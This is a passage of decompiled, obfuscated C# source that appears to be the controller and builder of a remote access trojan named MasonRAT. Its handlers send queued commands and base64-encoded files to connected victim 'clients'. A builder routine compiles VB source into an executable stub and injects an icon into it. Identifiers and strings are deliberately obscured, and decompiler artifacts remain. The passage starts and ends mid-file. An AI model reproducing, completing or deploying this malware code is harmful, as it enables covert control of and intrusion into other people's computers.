      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1695) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1696))));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cـڙﯧـ\u060Fـــح̍ۧڙـﯧ(object sender, FormClosingEventArgs e)
  {
    try
    {
      this.\u2694️MasonRAT\u270C\u060Dﻻٺدئـڕٺڞ\u060Bٸ̍ﮪ\u0609?.Dispose();
      Environment.Exit(0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270C̍\u060Dدٻڙ\u060D\u060A\u060Bڙۜۡڙ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1697));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C̍ڛمـ\u060Bـ\u060Bـ\u060Bڦٻـۭٺ(object sender, EventArgs e)
  {
    try
    {
      System.Diagnostics.Process.Start(AppDomain.CurrentDomain.BaseDirectory + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1698));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cۨــ\u060A\u060Bء\u060Aـۧـ\u0609\u060A(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cڙـڙژْ\u060Aﻼـڙؤ\u0608ـــ(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C\u060C\u060Aـڜٽ\u060Aــــ\u0609ژـ\u060A\u0609ٸ\u0608(
    object sender,
    EventArgs e)
  {
    this.\u2694️MasonRAT\u270C\u060D\u0608ڞۧ\u0609ؤ̍\u0609ـۨـحۭۏد̍ٸٻ\u060E\u060B.Items.Clear();
  }

  private void \u2694️MasonRAT\u270Cژةۭٺڙ\u060Bـﻋ؁ﮪڙﻋ(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cبٸﯧــڙـ\u060Cــ\u060Cدــﯧ\u060F\u060F\u060E(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C\u060B\u0608ئ̨\u060Bڕٻﻼڙ\u0609\u060A\u060Eڛټـ(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    string Left = Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1699), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1700), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1701), ((1275725997 > 897047791 ? -1072394489 : -1429859318) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) - ~(996332324 + 76062163 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 >> 1), (1121003395 - 851519364 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ^ 143931042 + 53213277 % 1830741488 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 << ((1684602591 ^ 11) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 >> 1));
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1702) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + Left);
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
    try
    {
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          if (Operators.CompareString(Left, (string) null, false) == 0)
            selectedItem.SubItems[((1427643563 > 1253890694 ? 1610612747 /*0x6000000B*/ : -2147483634 /*0x8000000E*/) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ^ (122035113 ^ 1262813694 >> 2128025237) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 << ((832605058 ^ (926231990 | 603963017)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 ^ 0)].Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1703);
          else
            selectedItem.SubItems[(1872985941 > 351373804 ? 1835249 : 2446998) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 - ((1101191393 ^ 832651609 % 1913857589) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 >> 1412173434 + 403452880 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0].Text = Left;
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Debug.WriteLine(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cﯧ\u060B\u0020ـٸٺﻋـ\u0608̍ڟ\u0020ڟ؁ۡۙ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1704));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270Cـۧۙ\u060Cدۡۧـــ\u0609\u060Eۭ(object sender, EventArgs e)
  {
    if (!this.\u2694️MasonRAT\u270Cــ\u060Bگۭ\u0609ـ\u060A\u0608̍)
      return;
    this.Opacity = 1.0;
  }

  private void \u2694️MasonRAT\u270C̍ىىؤټـۙٻـئ\u060Dطﻋ\u060A(object sender, EventArgs e)
  {
    this.Opacity = 0.95;
  }

  private void \u2694️MasonRAT\u270C̍\u060Fْڛژ\u060A\u0609ٺـڙ(object sender, EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C\u0608ٺا\u060Aۡٻـ\u060D\u0609\u0608ڙٻبـۧٽ\u060D(
    object sender,
    EventArgs e)
  {
    this.\u2694️MasonRAT\u270C\u060Dةﮪ\u0609ـټ\u0609ْ\u0609̍ــ.SelectedIndex = 1;
  }

  private void \u2694️MasonRAT\u270Cـح\u060Aبۨم\u060Aۡـ\u060C(object sender, EventArgs e)
  {
    this.\u2694️MasonRAT\u270C\u060Dةﮪ\u0609ـټ\u0609ْ\u0609̍ــ.SelectedIndex = ((593192722 ^ 593192733 % 1710312643) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 ^ (-2037947848 ^ -2037947851) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> -0;
  }

  private void \u2694️MasonRAT\u270Cـد\u060F\u060F\u060Dڝﻻۡ\u060D\u060D\u060B\u060A\u060Eد(
    object sender,
    PaintEventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270C\u0020ـ\u0609\u060A\u0609ۏ\u0609\u0609\u060Eٺ(
    object sender,
    EventArgs e)
  {
  }

  private void \u2694️MasonRAT\u270Cڝ\u060Dڙ\u0608\u060Dڼـداڝ\u0608\u060Cـ\u060B\u0609ح(
    object sender,
    EventArgs e)
  {
    this.\u2694️MasonRAT\u270C\u060Dةﮪ\u0609ـټ\u0609ْ\u0609̍ــ.SelectedIndex = ((3438133 ^ 21) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 > -52097855 - -1734066541 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 ? (14 ^ 10) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 : (-1998510983 ^ -1998510982) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1);
  }

  private void \u2694️MasonRAT\u270C̍ٺـ\u060A\u0609ۨﻻـۡڛ\u060Dۙح\u060Dﻻــؤـ\u060A(
    object sender,
    ToolStripItemClickedEventArgs e)
  {
  }

  public void \u2694️MasonRAT\u270C\u060Aـۙ\u060D\u060Aۙۏــ\u060Bؤ\u0609(
    string msg,
    Info.enmType type)
  {
    new Info().\u2694️MasonRAT\u270Cـڙ\u0608\u060Dـٻۚﻋـ\u060A\u060Fٻ\u060Bْڞ\u0608\u0609ـ(msg, type);
  }

  public void \u2694️MasonRAT\u270C\u0608ٺبــؤﻋــ\u0608ژ\u060Eـۡ\u060D\u060Eئڙـڼ(
    string Path,
    string Code)
  {
    try
    {
      VBCodeProvider vbCodeProvider = new VBCodeProvider((IDictionary<string, string>) new Dictionary<string, string>()
      {
        {
          \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1705),
          \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1706)
        }
      });
      CompilerParameters options = new CompilerParameters();
      string str = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1707);
      CompilerParameters compilerParameters = options;
      compilerParameters.GenerateExecutable = true;
      compilerParameters.OutputAssembly = Path;
      compilerParameters.CompilerOptions = str;
      compilerParameters.IncludeDebugInformation = false;
      compilerParameters.ReferencedAssemblies.Add(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1708));
      compilerParameters.ReferencedAssemblies.Add(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1709));
      compilerParameters.ReferencedAssemblies.Add(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1710));
      compilerParameters.ReferencedAssemblies.Add(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1711));
      compilerParameters.ReferencedAssemblies.Add(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1712));
      CompilerResults compilerResults = vbCodeProvider.CompileAssemblyFromSource(options, Code);
      if (compilerResults.Errors.Count > 0)
      {
        try
        {
          foreach (object error in (CollectionBase) compilerResults.Errors)
          {
            int num = (int) Interaction.MsgBox(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(error), (System.Type) null, \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1713), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), (MsgBoxStyle) ((524552325 + (1777317935 << 1738548370) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) - (484439498 - -83306219 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 >> ((-1433163594 ^ 1073030161 << 1688479906) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ -0));
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
        this.\u2694️MasonRAT\u270Cمڣمٻدــ\u060A\u0609ـ = false;
      }
      try
      {
        if (this.\u2694️MasonRAT\u270C\u060F\u0608ى\u060D\u060Cټڙ\u060Aـټــۡ\u060E.Checked)
        {
          Thread.Sleep(((-8857331 ^ 11) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + ((-1068365742 ^ ~308056160) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) % (-1337126966 - -2099063597 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0));
          IconInjector.\u2694️MasonRAT\u270C̍\u060F\u0609\u060A\u060D\u060Fــئ\u060Aى(Path, this.\u2694️MasonRAT\u270Cگ\u0608ڙ\u060Dٻڙ\u060Bـح\u060Fـڙ);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      GC.Collect();
      this.\u2694️MasonRAT\u270C\u060Aـۙ\u060D\u060Aۙۏــ\u060Bؤ\u0609(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1714), Info.enmType.Success);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      int num = (int) MessageBox.Show(ex.Message);
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cـڙ\u0608̍\u060E\u0609ڙ\u0609بـ\u060Dﻻـﻻ\u060A\u060A\u060Eء(
    object sender,
    EventArgs e)
  {
    try
    {
      if (this.\u2694️MasonRAT\u270Cۙ\u0609ـ\u060Aــ\u0608\u060Dـ\u0020̍\u060A\u060Aـ.Text.Length > (-1594054063 - 1614128378 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) - ((1348603904 > 577572706 ? 1086784823 : 1449046430) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1) | this.\u2694️MasonRAT\u270Cۙ\u0609ـ\u060Aــ\u0608\u060Dـ\u0020̍\u060A\u060Aـ.Text.Length < 1)
        this.\u2694️MasonRAT\u270Cمۙڙڙۙـﻻٸ\u060Eڅ\u060D.Enabled = false;
      else
        this.\u2694️MasonRAT\u270Cمۙڙڙۙـﻻٸ\u060Eڅ\u060D.Enabled = true;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      this.\u2694️MasonRAT\u270Cمۙڙڙۙـﻻٸ\u060Eڅ\u060D.Enabled = false;
      ProjectData.ClearProjectError();
    }
  }

  private void \u2694️MasonRAT\u270Cٻ\u0609ۭڣۡ\u060Eــــ\u0608\u060Bـڝٸڇــ(
    object sender,
    MouseEventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٽـڅـڦ\u0609ﯧد\u060F\u060Bــۙـٺ\u060Bاـ.Checked)
